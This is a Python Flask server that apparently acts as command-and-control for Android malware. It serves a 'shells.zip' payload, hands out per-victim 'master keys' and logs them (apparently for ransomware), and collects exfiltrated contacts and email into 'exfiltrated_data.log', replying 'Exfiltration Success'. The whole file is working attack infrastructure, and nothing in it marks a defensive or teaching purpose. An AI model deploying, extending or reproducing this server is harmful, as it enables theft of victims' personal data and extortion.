from flask import Flask, request, make_response, send_file
import socket
import os
import base64
import random
import string
from urllib.parse import parse_qs
from datetime import datetime
import re

SERVER_HOSTNAME = socket.gethostname()
SERVER_IP = socket.gethostbyname(SERVER_HOSTNAME)
PID = str(os.getpid())


print("HTTPS Server started on: " + SERVER_HOSTNAME + " with IP: " + SERVER_IP + "\nPID: " + PID)
app = Flask(__name__)



@app.route('/process_command', methods=['GET'])
def process_command():
    client_ip = request.remote_addr
    print("'/process_command' -  incoming request from IP: " + client_ip)
    return send_file("shells.zip", as_attachment=True)


# Get master key
@app.route('/get_mk', methods=['GET'])
def get_mk():
    mk = randStr()
    victimID = randStr()
    responseStr = victimID + ':' + mk
    print(responseStr)

    response_bytes = responseStr.encode("ascii")
    base64_bytes = base64.b64encode(response_bytes)
    base64_str = base64_bytes.decode("ascii")
    print(base64_str)

    scriptDirPath = os.path.dirname(__file__)
    fileDelimiter = ''
    if os.name == 'nt':
        fileDelimiter = '\\'
    elif os.name == 'posix':
        fileDelimiter = '/'
    finalPath = scriptDirPath + fileDelimiter + 'masterkeys.txt'
    writeToFile(finalPath, responseStr)

    return base64_str

# Route for data exfiltration POST HTTP Request to process
@app.route('/postData', methods=['POST'])
def postData():
    '''Android Contacts and Email is processed and stored into log file'''
    if request.method == "POST":
    	data = parse_qs(request.get_data()) #URL Decoding
    	with open("exfiltrated_data.log", "a") as f:

    	    f.write("Date " + datetime.now().strftime("%d/%m/%Y %H:%M:%S") + "\n")
    	    for key,value in data.items():
    	        f.write(str(key.decode('utf-8')) + "\n") 
    	        for x in range(len(value)): 
    	            decodedString = value[x].decode('utf-8') 
    	            begin, end = decodedString.find('{'), decodedString.rfind('}')
    	            filteredString = decodedString[begin: end+1]
    	            f.write(filteredString + "\n")
    	    f.write("\n")
    	    f.close()
    	
    return "Exfiltration Success"

# Custom methods
def randStr(chars = string.ascii_lowercase + string.ascii_uppercase + string.digits, N=16):
    return ''.join(random.choice(chars) for _ in range(N))


def writeToFile(filePath, string):
    file = open(filePath, 'a+')
    file.write(string + '\n')
    file.close()

if __name__ == '__main__':
    # app.run(host="0.0.0.0", port=8080, ssl_context='adhoc')
    app.run(host="0.0.0.0", port=8080)


